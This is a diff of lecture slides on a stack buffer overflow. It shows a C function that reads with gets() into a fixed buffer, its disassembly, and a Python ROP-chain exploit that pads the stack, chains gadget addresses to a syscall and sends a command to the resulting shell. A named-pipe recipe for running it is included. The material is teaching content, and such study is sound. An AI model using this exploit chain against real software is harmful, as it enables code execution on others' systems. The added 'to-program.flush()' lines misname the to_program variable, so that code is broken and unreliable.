@@ -3,7 +3,7 @@
 ```c
 void vulnerable() {
     char str[128];
-    printf("Input: ");
+    printf("Input: "); fflush(stdout);
     gets(str);
 }
 
@@ -59,6 +59,8 @@ vulnerable:
   mov    $0x1,%edi
   xor    %eax,%eax
   call   ___printf_chk
+  mov    stdout(%rip),%rdi        # 4c56f0 <stdout>
+  call   _IO_fflush
   mov    %rsp,%rdi
   call   _IO_gets
   add    $0x88,%rsp
@@ -105,8 +107,8 @@ vulnerable:
 
 ::: {.column width=59%}
 
-```{.python code-line-numbers="|3-4|10|12-16"}
-from struct import pack
+```{.python code-line-numbers="|3-4|10-11|13-17"}
+...
 
 # Padding goes here
 p = b'A' * 0x88 # <-- modified
@@ -116,16 +118,41 @@ p += pack('<Q', 0x0000000000409ece) # pop rsi ; ret
 p += pack('<Q', 0x0000000000401c14) # syscall
 
 to_program.write(p + b'\n')
+to-program.flush()
 
 # wait for shell to start
     # hopefully this is long enough
 time.sleep(1)
 to_program.write('my_malicious_command\n')
+to-program.flush()
 ```
 
 :::
 
 ::::
+
+### Running
+```python
+to_program = sys.stdout.buffer
+from_program = sys.stdin.buffer
+```
+<hr>
+```bash
+# mkfifo = make first-in, first-out file AKA named pipe
+mkfifo vulnin
+mkfifo vulnout
+
+# run attack.py with
+    # output to vulnin (>vulnin)
+    # input to vulnout (<vulnout)
+    # in the background (&)
+python3 attack.py >vulnin <vulnout &
+
+# run ./vulnerable with input from vulnin (<vulnin)
+    # redirecting its output to the command 'tee vulnout'
+        # tee reads stdin, copies to stdout + other files
+./vulnerable <vulnin | tee vulnout
+```
 
 ### ROPgadget chain goal
 
